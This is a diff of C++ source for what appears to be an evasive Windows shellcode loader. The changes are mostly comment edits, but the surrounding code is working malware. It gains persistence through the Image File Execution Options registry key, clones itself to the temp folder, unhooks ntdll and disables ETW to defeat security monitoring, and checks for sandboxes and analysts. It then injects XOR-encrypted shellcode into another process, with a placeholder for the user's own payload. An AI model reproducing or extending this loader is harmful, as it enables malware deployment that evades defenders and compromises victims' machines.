@@ -43,8 +43,7 @@ std::vector<unsigned char> parseShell(const std::string& shellcode) {
     }
     return bytes;
 }
-//Add registry entry persistence dynamically (gflag)
-//Add registry entry persistence dynamically (gflag)
+//Add registry entry persistence (dynamic) (gflag)
 void Persist(const char* newPath) {
     HKEY hKey;
     if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, OBF("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\wuauclt.exe"), 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
@@ -53,7 +52,7 @@ void Persist(const char* newPath) {
     }
 }
 
-// Clone itself to the temp folder
+//Clone  to the temp folder
 void TempClone(char* dstPath) {
     char src[MAX_PATH];
     GetModuleFileNameA(NULL, src, OBF(MAX_PATH));
@@ -73,7 +72,7 @@ DWORD getPID(const wchar_t* processName) {
     return OBF(0);
 }
 
-// Unhook ntdll.dll
+//Unhook ntdll.dll
 BOOL UnhookNTDLL(HMODULE hNtdll, LPVOID pMapping) {
     DWORD oldprotect = 0;
     PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
@@ -108,7 +107,7 @@ BOOL FuckTheETW() {
     return TRUE;
 }
 
-// Check if user has recent files
+//Check if user has recent files
 bool RecentFilesCheck(int threshold) {
     TCHAR recentPath[MAX_PATH];
     if (SUCCEEDED(SHGetFolderPath(NULL, OBF(CSIDL_RECENT), NULL, 0, recentPath))) {
@@ -131,7 +130,7 @@ bool RecentFilesCheck(int threshold) {
     }
     return false;
 }
-//Check for nono programs
+//Check for no-no programs
 BOOL ProcCheck1(const wchar_t* processName) {
     BOOL exists = FALSE;
     PROCESSENTRY32W entry;
@@ -144,7 +143,7 @@ BOOL ProcCheck1(const wchar_t* processName) {
 
     if (Process32FirstW(snapshot, &entry)) {
         do {
-            if (_wcsicmp(entry.szExeFile, processName) == 0) { // Case-insensitive comparison
+            if (_wcsicmp(entry.szExeFile, processName) == 0) { 
                 exists = TRUE;
                 break;
             }
@@ -170,7 +169,7 @@ BOOL ProcCheck2() {
     }
     return FALSE;
 }
-//Calculate mousemath to determine if bot
+//Calculate mousemath to determine if humanized
 double MouseMath(const POINT& p1, const POINT& p2, const POINT& p3) {
     double dx1 = p1.x - p2.x;
     double dy1 = p1.y - p2.y;
@@ -187,7 +186,7 @@ bool MouseCheck() {
         POINT p;
         GetCursorPos(&p);
         points.push_back(p);
-        Sleep(50); // 50 msec 
+        Sleep(50);
     }
 
     for (size_t i = 1; i < points.size() - 1; ++i) {
@@ -198,7 +197,7 @@ bool MouseCheck() {
     }
     return true;
 }
-//Check for recent activity
+//Check recent activity
 bool ActivityCheck() {
     LASTINPUTINFO lastInputInfo;
     lastInputInfo.cbSize = sizeof(LASTINPUTINFO);
@@ -260,7 +259,7 @@ bool Less4Ram() {
     return false;
 }
 
-// Check C:// Cap
+//Check C drive Cap
 bool Less128() {
     ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
 
@@ -348,7 +347,7 @@ int main() {
         return -1;
     }
 
-    std::string encryptedShellcodeStr = OBF(""); // Place your XOR encrypted shellcode string here (format like: \\x56\\xe2\\x29\\x4e)
+    std::string encryptedShellcodeStr = OBF(""); //Place your XOR encrypted shellcode here (**need** to format like: \\x56\\xe2\\x29\\x4e)
     unsigned char key = 0xAA;
     std::vector<unsigned char> shellcode = parseShell(encryptedShellcodeStr);
 
@@ -358,7 +357,7 @@ int main() {
         return -1;
     }
 
-    size_t chunkSize = 10; // Adjust the chunk size as needed
+    size_t chunkSize = 10; //Adjust the chunk size
     size_t totalSize = shellcode.size();
     SIZE_T bytesWritten;
 
@@ -419,7 +418,7 @@ int main() {
         return -1;
     }
     Sleep(5555);
-    // Revert memory permissions to non-executable (thx gargoyle technique <3)
+    //Revert mems to non executable (thx gargoyle technique <3)
     pVirtualProtectEx(hProcess, alloc, shellcode.size(), PAGE_READWRITE, &oldProtect);
 
     
